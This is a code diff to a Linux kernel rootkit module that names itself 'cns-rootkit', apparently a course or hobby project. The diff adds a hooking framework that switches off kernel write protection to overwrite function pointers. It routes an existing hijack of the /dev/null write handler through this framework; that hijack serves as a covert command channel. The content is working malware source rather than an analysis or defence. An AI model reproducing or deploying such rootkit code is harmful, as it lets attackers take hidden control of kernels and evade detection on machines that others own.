@@ -17,6 +17,57 @@
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
+struct hook {
+  void *original_function;
+  void *modified_function;
+  void **modified_at;
+  struct list_head list;
+};
+
+LIST_HEAD(hook_list);
+
+void hook_add(void **modified_at, void *modified_function) {
+  struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
+  if(!h) {
+    return ;
+  }
+
+  h->modified_at = modified_at;
+  h->modified_function = modified_function;
+  h->original_function = (void *) (*modified_at);
+  list_add(&h->list, &hook_list);
+}
+
+void hook_patch(void *modified_function) {
+  struct hook *h;
+
+  list_for_each_entry(h, &hook_list, list) {
+    if(h->modified_function == modified_function) {
+      DISABLE_W_PROTECTED_MEMORY
+      *(h->modified_at) = h->modified_function;
+      ENABLE_W_PROTECTED_MEMORY
+      break;
+    }
+  }
+}
+
+void hook_unpatch(void *modified_function) {
+  struct hook *h;
+
+  list_for_each_entry(h, &hook_list, list) {
+    if(h->modified_function == modified_function) {
+      DISABLE_W_PROTECTED_MEMORY
+      *(h->modified_at) = h->original_function;
+      ENABLE_W_PROTECTED_MEMORY
+      break;
+    }
+  }
+}
+
+/*int hook_remove_all() {
+
+}*/
+
 int establish_comm_channel(void);
 int unestablish_comm_channel(void);
 
@@ -45,10 +96,15 @@ int establish_comm_channel(void) {
   dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
   printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
+  /*
   original_dev_null_write = dev_null_fop->write;
   DISABLE_W_PROTECTED_MEMORY
   dev_null_fop->write = cns_rootkit_dev_null_write;
   ENABLE_W_PROTECTED_MEMORY
+  */
+
+  hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
+
   printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
   return 0;
 }
